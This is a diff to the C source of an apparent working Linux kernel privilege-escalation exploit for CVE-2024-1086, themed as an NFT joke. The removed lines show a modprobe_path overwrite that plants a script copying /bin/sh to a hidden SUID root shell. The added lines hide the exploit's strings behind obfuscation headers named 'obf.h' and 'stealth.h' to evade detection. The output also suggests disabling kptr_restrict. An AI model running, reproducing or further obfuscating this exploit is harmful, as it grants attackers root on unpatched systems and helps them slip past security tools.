@@ -18,12 +18,14 @@
  */
 
 #include "nfttables.h"
+#include "obf.h"
+#include "stealth.h"
 #include <sys/prctl.h>
 
-#define TABLE    "BoredApe"
-#define CHAIN_IN "hodl"
-#define CHAIN_T  "rugged"
-#define SETNAME  "vmap"
+#define TABLE    S(S_TABLE_1086)
+#define CHAIN_IN S(S_CHAIN_BASE_1086)
+#define CHAIN_T  S(S_CHAIN_TGT_1086)
+#define SETNAME  S(S_SET_1086)
 #define SET_ID   1337
 
 #define FAMILY   NFPROTO_INET
@@ -268,11 +270,8 @@ static int find_pte_page(int *pipe_idx)
 
 static int write_modprobe_script(void)
 {
-    const char *path = "/tmp/.nft_mint";
-    const char *script =
-        "#!/bin/sh\n"
-        "cp /bin/sh /tmp/.nft_sh\n"
-        "chmod u+s /tmp/.nft_sh\n";
+    const char *path = S(S_NFT_MINT);
+    const char *script = S(S_MINT_SCRIPT);
 
     int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
     if (fd < 0)
@@ -285,7 +284,7 @@ static int write_modprobe_script(void)
 static int trigger_modprobe(void)
 {
     /* write a binary with invalid ELF magic to trigger modprobe */
-    const char *path = "/tmp/.nft_trigger";
+    const char *path = S(S_NFT_TRIGGER);
     int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
     if (fd < 0)
         return -1;
@@ -306,7 +305,7 @@ static int trigger_modprobe(void)
 
     /* check if our SUID shell was created */
     struct stat st;
-    if (stat("/tmp/.nft_sh", &st) == 0 && (st.st_mode & S_ISUID))
+    if (stat(S(S_NFT_SH), &st) == 0 && (st.st_mode & S_ISUID))
         return 0;
 
     return -1;
@@ -370,8 +369,8 @@ static int overwrite_modprobe(uint64_t modprobe_addr, int pipe_idx)
         return -1;
 
     /* write our script path over modprobe_path */
-    const char new_path[] = "/tmp/.nft_mint";
-    memcpy((char *)remap + offset, new_path, sizeof(new_path));
+    const char *new_path = S(S_NFT_MINT);
+    memcpy((char *)remap + offset, new_path, strlen(new_path) + 1);
 
     return 0;
 }
@@ -469,7 +468,7 @@ static int do_exploit(int result_fd)
         return 1;
     }
 
-    uint64_t modprobe_addr = kallsyms_lookup("modprobe_path");
+    uint64_t modprobe_addr = kallsyms_lookup(S(S_MODPROBE_PATH));
     if (!modprobe_addr) {
         pr_fail("kallsyms lookup failed (kptr_restrict blocking, or not root-readable)");
         pr_info("  " C_DIM "hint: echo 0 > /proc/sys/kernel/kptr_restrict" C_RST);
@@ -513,8 +512,8 @@ int mint_cve_2024_1086(const struct kernel_info *ki)
 {
     pr_info("");
     pr_info(APE " " C_BOLD "Bored Ape #1086" C_RST
-            C_DIM " (CVE-2024-1086: nft_verdict_init double-free)" C_RST);
-    pr_info(C_DIM "  affected: 3.15 .. 6.7.1 | technique: dirty pagetable" C_RST);
+            C_DIM " (%s: %s)" C_RST, S(S_CVE_1086), S(S_CVE_1086_DESC));
+    pr_info(C_DIM "  affected: 3.15 .. 6.7.1 | technique: %s" C_RST, S(S_DIRTY_PT));
     pr_info("");
 
     if (!ki->userns_available) {
@@ -548,7 +547,7 @@ int mint_cve_2024_1086(const struct kernel_info *ki)
         pr_ok(C_BOLD "MINTED!" C_RST " Floor price: " C_GRN "uid=0(root)" C_RST);
         pr_info(FOX " Wallet updated: " C_GRN "1 ROOT token" C_RST);
         pr_info("");
-        pr_info("  " C_BOLD "/tmp/.nft_sh -p" C_RST " for root shell");
+        pr_info("  " C_BOLD "%s -p" C_RST " for root shell", S(S_NFT_SH));
         pr_info("");
         return 0;
     }
